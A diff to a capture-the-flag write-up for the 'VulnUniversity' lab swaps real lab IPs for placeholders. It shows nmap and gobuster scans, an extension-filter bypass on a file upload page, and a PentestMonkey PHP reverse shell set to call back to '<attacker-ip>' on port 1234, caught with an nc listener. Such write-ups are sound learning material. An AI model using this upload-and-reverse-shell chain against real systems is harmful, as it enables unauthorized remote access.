@@ -29,7 +29,7 @@ VulnUniversity is a beginner-friendly room that walks you through a pretty reali
 Started with a basic nmap scan to see what's running:
 
 ```bash
-nmap -sV 10.49.146.175
+nmap -sV <target-ip>
 ```
 
 ![nmap initial scan](screenshots/01-nmap-initial-scan.png)
@@ -60,7 +60,7 @@ Port 3333 is where the web server is. Non-standard port, so easy to miss if you'
 Ran gobuster against the web server on 3333:
 
 ```bash
-gobuster dir -u http://10.49.146.175:3333 -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://<target-ip>:3333 -w /usr/share/wordlists/dirb/common.txt
 ```
 
 ![gobuster running](screenshots/05-gobuster-scan.png)
@@ -77,7 +77,7 @@ Found a `/internal` directory — this turned out to be a file upload page.
 
 ### 3. The upload page
 
-Went to `http://10.49.146.175:3333/internal/` and found a form to upload files.
+Went to `http://<target-ip>:3333/internal/` and found a form to upload files.
 
 ![internal upload page](screenshots/09-web-internal-page.png)
 
@@ -104,7 +104,7 @@ Looking at response lengths — `.phtml` came back with a different length than 
 Grabbed the PentestMonkey PHP reverse shell, renamed it to `.phtml`, and changed the IP/port to point back to my machine:
 
 ```php
-$ip = '10.49.106.42';
+$ip = '<attacker-ip>';
 $port = 1234;
 ```
 
@@ -117,7 +117,7 @@ nc -lvnp 1234
 Uploaded the shell through `/internal`, then navigated to:
 
 ```
-http://10.49.146.175:3333/internal/uploads/php-reverse-shell.phtml
+http://<target-ip>:3333/internal/uploads/php-reverse-shell.phtml
 ```
 
 ![reverse shell upload](screenshots/13-reverse-shell-upload.png)
